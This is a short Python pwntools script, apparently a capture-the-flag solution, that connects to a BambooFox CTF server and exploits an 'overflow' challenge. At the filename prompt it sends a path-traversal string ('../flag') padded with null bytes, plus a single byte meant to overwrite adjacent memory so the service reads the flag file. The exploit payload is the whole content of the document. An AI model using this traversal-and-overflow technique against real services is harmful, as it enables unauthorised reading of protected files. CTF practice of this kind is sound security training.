#!/usr/bin/env python

from pwn import *

# r = process('./overflow')
r = remote('bamboofox.cs.nctu.edu.tw', 10004)

r.recvuntil('Filename: ')

# raw_input('#')

r.sendline('../flag'.ljust(100, '\x00') + '\xb4')

r.interactive()
